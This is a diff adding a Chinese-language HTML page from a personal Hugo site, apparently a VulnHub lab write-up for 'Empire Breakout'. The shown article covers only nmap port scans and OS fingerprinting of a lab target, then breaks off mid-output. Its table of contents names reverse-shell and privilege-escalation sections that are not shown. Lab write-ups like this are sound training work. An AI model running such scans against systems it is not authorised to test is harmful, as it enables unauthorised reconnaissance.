@@ -1,0 +1,1130 @@
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="一、信息收集#靶机ip192.168.242.94
+1.1 端口扫描（教训）#1┌──(kali㉿kali)-[~] 2└─$ nmap -A 192.168.242.94 3Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 22:10 EST 4Nmap scan report for 192.168.242.94 5Host is up (0.0089s latency). 6All 1000 scanned ports on 192.168.242.94 are in ignored states. 7Not shown: 1000 filtered tcp ports (no-response) 8Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 9Aggressive OS guesses: D-Link DFL-700 firewall (89%), HP Officejet Pro 8500 printer (89%), IBM i 7.4 (89%), ReactOS 0.3.7 (89%), Sanyo PLC-XU88 digital video projector (89%), Sonus GSX9000 VoIP proxy (88%), Asus WL-500gP wireless broadband router (88%), Microsoft Windows 2000 (88%), Microsoft Windows Server 2003 Enterprise Edition SP2 (88%), Microsoft Windows Server 2003 SP2 (88%) 10No exact OS matches for host (test conditions non-ideal). 11Network Distance: 2 hops 12 13TRACEROUTE (using port 80/tcp) 14HOP RTT ADDRESS 151 0.15 ms 192.168.203.2 162 0.15 ms 192.168.242.94 17 18OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 19Nmap done: 1 IP address (1 host up) scanned in 247.15 seconds 20 21┌──(kali㉿kali)-[~] 22└─$ sudo nmap -A 192.168.242.94 23[sudo] password for kali: 24Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 22:23 EST 25Nmap scan report for 192.168.242.94 26Host is up (0.00028s latency). 27All 1000 scanned ports on 192.168.242.94 are in ignored states. 28Not shown: 1000 filtered tcp ports (no-response) 29Too many fingerprints match this host to give specific OS details 30 31TRACEROUTE (using port 80/tcp) 32HOP RTT ADDRESS 331 ... 30 34 35OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 36Nmap done: 1 IP address (1 host up) scanned in 34.11 seconds第一个命令结果是1000 filtered tcp ports，因为没加sudo，没扫出端口，Nmap默认切换了底层的扫描技术，这里用的是全连接扫描，它被迫使用操作系统的标准网络接口来执行TCP Connect Scan(-sT)，需要完成完整的TCP三次握手，而加上sudo，使用SYN Stealth Scan(-sS)，只发送第一个握手包(SYN)，不建立完整连接。 而防火墙会对完整的连接请求敏感，一旦发现短时间内尝试连接大量端口，会判定为攻击并封锁我的ip
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/vulnhub/easy/vulnhub-Empire_Breakout/">
+  <meta property="og:site_name" content="vnccer">
+  <meta property="og:title" content="Empire Breakout">
+  <meta property="og:description" content="一、信息收集#靶机ip192.168.242.94
+1.1 端口扫描（教训）#1┌──(kali㉿kali)-[~] 2└─$ nmap -A 192.168.242.94 3Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 22:10 EST 4Nmap scan report for 192.168.242.94 5Host is up (0.0089s latency). 6All 1000 scanned ports on 192.168.242.94 are in ignored states. 7Not shown: 1000 filtered tcp ports (no-response) 8Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 9Aggressive OS guesses: D-Link DFL-700 firewall (89%), HP Officejet Pro 8500 printer (89%), IBM i 7.4 (89%), ReactOS 0.3.7 (89%), Sanyo PLC-XU88 digital video projector (89%), Sonus GSX9000 VoIP proxy (88%), Asus WL-500gP wireless broadband router (88%), Microsoft Windows 2000 (88%), Microsoft Windows Server 2003 Enterprise Edition SP2 (88%), Microsoft Windows Server 2003 SP2 (88%) 10No exact OS matches for host (test conditions non-ideal). 11Network Distance: 2 hops 12 13TRACEROUTE (using port 80/tcp) 14HOP RTT ADDRESS 151 0.15 ms 192.168.203.2 162 0.15 ms 192.168.242.94 17 18OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 19Nmap done: 1 IP address (1 host up) scanned in 247.15 seconds 20 21┌──(kali㉿kali)-[~] 22└─$ sudo nmap -A 192.168.242.94 23[sudo] password for kali: 24Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 22:23 EST 25Nmap scan report for 192.168.242.94 26Host is up (0.00028s latency). 27All 1000 scanned ports on 192.168.242.94 are in ignored states. 28Not shown: 1000 filtered tcp ports (no-response) 29Too many fingerprints match this host to give specific OS details 30 31TRACEROUTE (using port 80/tcp) 32HOP RTT ADDRESS 331 ... 30 34 35OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 36Nmap done: 1 IP address (1 host up) scanned in 34.11 seconds第一个命令结果是1000 filtered tcp ports，因为没加sudo，没扫出端口，Nmap默认切换了底层的扫描技术，这里用的是全连接扫描，它被迫使用操作系统的标准网络接口来执行TCP Connect Scan(-sT)，需要完成完整的TCP三次握手，而加上sudo，使用SYN Stealth Scan(-sS)，只发送第一个握手包(SYN)，不建立完整连接。 而防火墙会对完整的连接请求敏感，一旦发现短时间内尝试连接大量端口，会判定为攻击并封锁我的ip">
+  <meta property="og:locale" content="zh">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+    <meta property="article:published_time" content="2026-03-11T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-03-11T00:00:00+00:00">
+
+
+  <meta itemprop="name" content="Empire Breakout">
+  <meta itemprop="description" content="一、信息收集#靶机ip192.168.242.94
+1.1 端口扫描（教训）#1┌──(kali㉿kali)-[~] 2└─$ nmap -A 192.168.242.94 3Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 22:10 EST 4Nmap scan report for 192.168.242.94 5Host is up (0.0089s latency). 6All 1000 scanned ports on 192.168.242.94 are in ignored states. 7Not shown: 1000 filtered tcp ports (no-response) 8Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 9Aggressive OS guesses: D-Link DFL-700 firewall (89%), HP Officejet Pro 8500 printer (89%), IBM i 7.4 (89%), ReactOS 0.3.7 (89%), Sanyo PLC-XU88 digital video projector (89%), Sonus GSX9000 VoIP proxy (88%), Asus WL-500gP wireless broadband router (88%), Microsoft Windows 2000 (88%), Microsoft Windows Server 2003 Enterprise Edition SP2 (88%), Microsoft Windows Server 2003 SP2 (88%) 10No exact OS matches for host (test conditions non-ideal). 11Network Distance: 2 hops 12 13TRACEROUTE (using port 80/tcp) 14HOP RTT ADDRESS 151 0.15 ms 192.168.203.2 162 0.15 ms 192.168.242.94 17 18OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 19Nmap done: 1 IP address (1 host up) scanned in 247.15 seconds 20 21┌──(kali㉿kali)-[~] 22└─$ sudo nmap -A 192.168.242.94 23[sudo] password for kali: 24Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 22:23 EST 25Nmap scan report for 192.168.242.94 26Host is up (0.00028s latency). 27All 1000 scanned ports on 192.168.242.94 are in ignored states. 28Not shown: 1000 filtered tcp ports (no-response) 29Too many fingerprints match this host to give specific OS details 30 31TRACEROUTE (using port 80/tcp) 32HOP RTT ADDRESS 331 ... 30 34 35OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 36Nmap done: 1 IP address (1 host up) scanned in 34.11 seconds第一个命令结果是1000 filtered tcp ports，因为没加sudo，没扫出端口，Nmap默认切换了底层的扫描技术，这里用的是全连接扫描，它被迫使用操作系统的标准网络接口来执行TCP Connect Scan(-sT)，需要完成完整的TCP三次握手，而加上sudo，使用SYN Stealth Scan(-sS)，只发送第一个握手包(SYN)，不建立完整连接。 而防火墙会对完整的连接请求敏感，一旦发现短时间内尝试连接大量端口，会判定为攻击并封锁我的ip">
+  <meta itemprop="datePublished" content="2026-03-11T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2026-03-11T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1757">
+
+<title>Empire Breakout | vnccer</title>
+<link rel="icon" href="/AK47.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/cybersecurity/vulnhub/easy/vulnhub-Empire_Breakout/">
+<link rel="stylesheet" href="/book.min.4c5f6b0a2c9458d9b295650ba6c81a5261a6e5925a9e3f4141ed0a7db0ed85ac.css" integrity="sha256-TF9rCiyUWNmylWULpsgaUmGm5ZJanj9BQe0KfbDthaw=" crossorigin="anonymous">
+
+
+  <script defer src="/fuse.min.js"></script>
+  <script defer src="/zh.search.min.397ea39ee9b7278158b3763fe9378bf4978298d0dc1d6c1dd3e5cf2b70c93ec0.js" integrity="sha256-OX6jnum3J4FYs3Y/6TeL9JeCmNDcHWwd0&#43;XPK3DJPsA=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+
+
+  
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/flamez.png" alt="Logo" /><span>vnccer</span>
+  </a>
+</h2>
+
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="搜索"
+    aria-label="搜索"
+    maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-286561e3ebfe5d4abf11bf6b3accf647" class="toggle" checked />
+    <label for="section-286561e3ebfe5d4abf11bf6b3accf647" class="flex">
+      <a role="button" class="">
+        🛡️网安</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d5df1c89b3beb5d08d89138670fc5f81" class="toggle" checked />
+    <label for="section-d5df1c89b3beb5d08d89138670fc5f81" class="flex">
+      <a role="button" class="">
+        VULNHUB</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-bfe4bf07ad333338fadcf4204b272d0e" class="toggle" checked />
+    <label for="section-bfe4bf07ad333338fadcf4204b272d0e" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Beelzebub_1/" class="">
+      Beelzebub: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Empire_Breakout/" class="active">
+      Empire Breakout</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-ICA_1/" class="">
+      ICA: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-jangow_1.0.1/" class="">
+      jangow 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Napping-1.0.1/" class="">
+      Napping: 1.0.1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-Noob_1/" class="">
+      Noob: 1</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/easy/vulnhub-The-planets_earth/" class="">
+      The planets earth</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b3c7140b1d41ab832458c80758cef6c9" class="toggle"  />
+    <label for="section-b3c7140b1d41ab832458c80758cef6c9" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cybersecurity/vulnhub/medium/vulnhub-Empire_lupinone/" class="">
+      Empire lupinone</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-199c80af73916a8116f7ec58495f5b3f" class="toggle"  />
+    <label for="section-199c80af73916a8116f7ec58495f5b3f" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-a030c4c9965a220abfa64a3686e7613a" class="toggle"  />
+    <label for="section-a030c4c9965a220abfa64a3686e7613a" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fb9a6f25a6a255f0f4b30e540b36ad0c" class="toggle"  />
+    <label for="section-fb9a6f25a6a255f0f4b30e540b36ad0c" class="flex">
+      <a role="button" class="">
+        easy</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-a2233ec12e82f4e6914028aa2070f6f8" class="toggle"  />
+    <label for="section-a2233ec12e82f4e6914028aa2070f6f8" class="flex">
+      <a role="button" class="">
+        medium</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ba1300881eec4936e836e14da59d30c1" class="toggle"  />
+    <label for="section-ba1300881eec4936e836e14da59d30c1" class="flex">
+      <a role="button" class="">
+        hard</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fa9454ab1e7bd524e0b944901d8ee1ef" class="toggle"  />
+    <label for="section-fa9454ab1e7bd524e0b944901d8ee1ef" class="flex">
+      <a role="button" class="">
+        📄论文</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-e8767d536f4b541fa88e254ae52e9a6c" class="toggle"  />
+    <label for="section-e8767d536f4b541fa88e254ae52e9a6c" class="flex">
+      <a role="button" class="">
+        💼未来</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-999ff5566a30021306af4121ef9667e4" class="toggle"  />
+    <label for="section-999ff5566a30021306af4121ef9667e4" class="flex">
+      <a role="button" class="">
+        🤖AI</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-ff104bad4707f72748825f13d917fdc0" class="toggle"  />
+    <label for="section-ff104bad4707f72748825f13d917fdc0" class="flex">
+      <a role="button" class="">
+        🛠️技能</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/" class="">
+      anaconda环境配置</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/SwitchyOmega-mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/" class="">
+      SwitchyOmega mv3操作记录</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/win-&#43;-r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" class="">
+      win &#43; r常用指令</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/skills/%E7%BD%91%E7%AB%99%E6%9E%84%E5%BB%BA/" class="">
+      个人网站构建</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-2c59dd5549b1fa1fffc365258122244c" class="toggle"  />
+    <label for="section-2c59dd5549b1fa1fffc365258122244c" class="flex">
+      <a role="button" class="">
+        ☕生活</a>
+      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
+    </label>
+  
+
+          
+  <ul>
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+<ul><li><a href="/posts/" title="404">404</a></li></ul>
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>Empire Breakout</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#一信息收集">一、信息收集</a>
+          <ul>
+            <li><a href="#11-端口扫描教训">1.1 端口扫描（教训）</a></li>
+            <li><a href="#12-端口扫描最佳思路">1.2 端口扫描（最佳思路）</a></li>
+            <li><a href="#13-http探测">1.3 http探测</a></li>
+            <li><a href="#14-1000020000端口">1.4 10000/20000端口</a></li>
+            <li><a href="#15-smb服务探测-139445端口">1.5 smb服务探测 139、445端口</a></li>
+          </ul>
+        </li>
+        <li><a href="#二漏洞利用">二、漏洞利用</a>
+          <ul>
+            <li><a href="#反弹shell失败">反弹shell（失败）</a></li>
+            <li><a href="#flag1">FLAG1</a></li>
+            <li><a href="#flag2">FLAG2</a></li>
+            <li><a href="#提权先反弹shell">提权（先反弹shell）</a></li>
+            <li><a href="#flag2-1">FLAG2</a></li>
+            <li><a href="#反思">反思</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown book-article"><h2 id="一信息收集">一、信息收集<a class="anchor" href="#%e4%b8%80%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86">#</a></h2>
+<p>靶机ip<code>192.168.242.94</code></p>
+<h3 id="11-端口扫描教训">1.1 端口扫描（教训）<a class="anchor" href="#11-%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f%e6%95%99%e8%ae%ad">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>└─$ nmap -A 192.168.242.94
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>Starting Nmap 7.95 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2026-01-21 22:10 EST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>Nmap scan report <span style="color:#ff7b72">for</span> 192.168.242.94
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.0089s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>All <span style="color:#a5d6ff">1000</span> scanned ports on 192.168.242.94 are in ignored states.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>Not shown: <span style="color:#a5d6ff">1000</span> filtered tcp ports <span style="color:#ff7b72;font-weight:bold">(</span>no-response<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>Warning: OSScan results may be unreliable because we could not find at least <span style="color:#a5d6ff">1</span> open and <span style="color:#a5d6ff">1</span> closed port
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>Aggressive OS guesses: D-Link DFL-700 firewall <span style="color:#ff7b72;font-weight:bold">(</span>89%<span style="color:#ff7b72;font-weight:bold">)</span>, HP Officejet Pro <span style="color:#a5d6ff">8500</span> printer <span style="color:#ff7b72;font-weight:bold">(</span>89%<span style="color:#ff7b72;font-weight:bold">)</span>, IBM i 7.4 <span style="color:#ff7b72;font-weight:bold">(</span>89%<span style="color:#ff7b72;font-weight:bold">)</span>, ReactOS 0.3.7 <span style="color:#ff7b72;font-weight:bold">(</span>89%<span style="color:#ff7b72;font-weight:bold">)</span>, Sanyo PLC-XU88 digital video projector <span style="color:#ff7b72;font-weight:bold">(</span>89%<span style="color:#ff7b72;font-weight:bold">)</span>, Sonus GSX9000 VoIP proxy <span style="color:#ff7b72;font-weight:bold">(</span>88%<span style="color:#ff7b72;font-weight:bold">)</span>, Asus WL-500gP wireless broadband router <span style="color:#ff7b72;font-weight:bold">(</span>88%<span style="color:#ff7b72;font-weight:bold">)</span>, Microsoft Windows <span style="color:#a5d6ff">2000</span> <span style="color:#ff7b72;font-weight:bold">(</span>88%<span style="color:#ff7b72;font-weight:bold">)</span>, Microsoft Windows Server <span style="color:#a5d6ff">2003</span> Enterprise Edition SP2 <span style="color:#ff7b72;font-weight:bold">(</span>88%<span style="color:#ff7b72;font-weight:bold">)</span>, Microsoft Windows Server <span style="color:#a5d6ff">2003</span> SP2 <span style="color:#ff7b72;font-weight:bold">(</span>88%<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>No exact OS matches <span style="color:#ff7b72">for</span> host <span style="color:#ff7b72;font-weight:bold">(</span>test conditions non-ideal<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>Network Distance: <span style="color:#a5d6ff">2</span> hops
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>TRACEROUTE <span style="color:#ff7b72;font-weight:bold">(</span>using port 80/tcp<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>HOP RTT     ADDRESS
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span><span style="color:#a5d6ff">1</span>   0.15 ms 192.168.203.2
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span><span style="color:#a5d6ff">2</span>   0.15 ms 192.168.242.94
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span>Nmap <span style="color:#ff7b72">done</span>: <span style="color:#a5d6ff">1</span> IP address <span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">1</span> host up<span style="color:#ff7b72;font-weight:bold">)</span> scanned in 247.15 seconds
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span>┌──<span style="color:#ff7b72;font-weight:bold">(</span>kali㉿kali<span style="color:#ff7b72;font-weight:bold">)</span>-<span style="color:#ff7b72;font-weight:bold">[</span>~<span style="color:#ff7b72;font-weight:bold">]</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">22</span><span>└─$ sudo nmap -A 192.168.242.94                                 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">23</span><span><span style="color:#ff7b72;font-weight:bold">[</span>sudo<span style="color:#ff7b72;font-weight:bold">]</span> password <span style="color:#ff7b72">for</span> kali: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">24</span><span>Starting Nmap 7.95 <span style="color:#ff7b72;font-weight:bold">(</span> https://nmap.org <span style="color:#ff7b72;font-weight:bold">)</span> at 2026-01-21 22:23 EST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">25</span><span>Nmap scan report <span style="color:#ff7b72">for</span> 192.168.242.94
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">26</span><span>Host is up <span style="color:#ff7b72;font-weight:bold">(</span>0.00028s latency<span style="color:#ff7b72;font-weight:bold">)</span>.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">27</span><span>All <span style="color:#a5d6ff">1000</span> scanned ports on 192.168.242.94 are in ignored states.
